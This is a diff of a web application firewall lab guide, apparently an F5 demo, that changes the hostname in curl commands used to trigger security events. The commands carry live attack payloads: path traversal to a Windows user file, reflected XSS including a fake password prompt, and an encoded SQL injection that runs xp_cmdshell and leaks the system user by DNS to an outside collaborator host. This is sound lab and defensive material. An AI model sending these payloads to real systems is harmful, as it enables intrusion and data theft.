@@ -30,16 +30,16 @@ In either location let's setup our shell with a variable populated with you adje
    .. code-block:: bash
 
       # Attempt to access a sensitive file on Windows host
-      curl "http://<your-namespace>-lb.lab-sec.f5demos.com/\?629503844d\=%5C%5C::1%5Cc$%5Cusers%5Cdefault%5Cntuser.dat"
+      curl "http://<your-namespace>.lab-sec.f5demos.com/\?629503844d\=%5C%5C::1%5Cc$%5Cusers%5Cdefault%5Cntuser.dat"
 
       # Attempt to perform a reflected XSS attack
-      curl "http://<your-namespace>-lb.lab-sec.f5demos.com/q=%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e"
+      curl "http://<your-namespace>.lab-sec.f5demos.com/q=%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e"
 
       # Attempt to perform a SQL Injection attack
-      curl "http://<your-namespace>-lb.lab-sec.f5demos.com/?4d4ad2dbdb=MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z"
+      curl "http://<your-namespace>.lab-sec.f5demos.com/?4d4ad2dbdb=MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z"
 
       # Attempt to perform a XSS attack via a shopping cart search parameter
-      curl "http://<your-namespace>-lb.lab-sec.f5demos.com/cart?search=aaa'><script>prompt('Please+enter+your+password');</script>"
+      curl "http://<your-namespace>.lab-sec.f5demos.com/cart?search=aaa'><script>prompt('Please+enter+your+password');</script>"
 
 Now that we have some security events generated, let's explore the Security Analytics dashboard.
 
